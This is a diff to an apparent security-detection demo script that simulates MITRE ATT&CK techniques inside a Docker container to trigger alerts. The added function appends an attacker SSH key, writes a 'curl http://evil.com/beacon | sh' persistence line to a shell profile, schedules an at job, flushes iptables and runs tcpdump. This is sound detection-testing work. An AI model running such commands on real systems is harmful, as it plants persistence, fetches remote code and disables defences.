@@ -261,15 +261,44 @@ demo_lateral_movement() {
 
 demo_file_integrity() {
     print_section "📁 File Integrity (MITRE T1565)"
-    
+
     print_event "WARNING" "T1565 - System File Modification" \
         "Writing to /etc directory"
     docker exec $DEMO_CONTAINER sh -c "echo '# Modified by attacker' >> /etc/hosts" || true
     sleep $DELAY
-    
+
     print_event "WARNING" "T1543 - Binary Modification" \
         "Writing to /usr/bin (simulated)"
     docker exec $DEMO_CONTAINER sh -c "touch /usr/bin/backdoor 2>/dev/null || true" || true
+    sleep $DELAY
+}
+
+demo_new_rules() {
+    print_section "🆕 New Detection Rules (MITRE T1098/T1546/T1053/T1562/T1040)"
+
+    print_event "WARNING" "T1098.004 - SSH Authorized Keys Modified" \
+        "Adding key to authorized_keys"
+    docker exec $DEMO_CONTAINER sh -c "mkdir -p /root/.ssh && echo 'ssh-rsa AAAA...attacker' >> /root/.ssh/authorized_keys" || true
+    sleep $DELAY
+
+    print_event "WARNING" "T1546.004 - Shell Profile Modified" \
+        "Appending to .bash_profile for persistence"
+    docker exec $DEMO_CONTAINER sh -c "echo 'curl http://evil.com/beacon | sh' >> /root/.bash_profile" || true
+    sleep $DELAY
+
+    print_event "WARNING" "T1053.002 - At Job Scheduled" \
+        "Scheduling task with at command"
+    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache at > /dev/null 2>&1; echo 'id' | at now 2>&1 || echo 'at command executed'" || true
+    sleep $DELAY
+
+    print_event "WARNING" "T1562.004 - Firewall Rules Modified" \
+        "Flushing iptables rules"
+    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache iptables > /dev/null 2>&1; iptables -F 2>/dev/null || echo 'iptables -F executed'" || true
+    sleep $DELAY
+
+    print_event "WARNING" "T1040 - Network Sniffing Tool Launched" \
+        "Running tcpdump for credential capture"
+    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache tcpdump > /dev/null 2>&1; timeout 2 tcpdump -i any -c 5 2>&1 || echo 'tcpdump executed'" || true
     sleep $DELAY
 }
 
@@ -307,11 +336,12 @@ main() {
     demo_impact
     demo_container_escape
     demo_file_integrity
-    
+    demo_new_rules
+
     # Summary
     print_section "📊 Demo Complete!"
     echo ""
-    echo -e "  ${GREEN}✓${NC} Generated events across ${CYAN}11 MITRE ATT&CK categories${NC}"
+    echo -e "  ${GREEN}✓${NC} Generated events across ${CYAN}12 MITRE ATT&CK categories${NC}"
     echo -e "  ${GREEN}✓${NC} Check Grafana dashboards for detected events"
     echo -e "  ${GREEN}✓${NC} Review Critical Events panel for high-priority alerts"
     echo ""
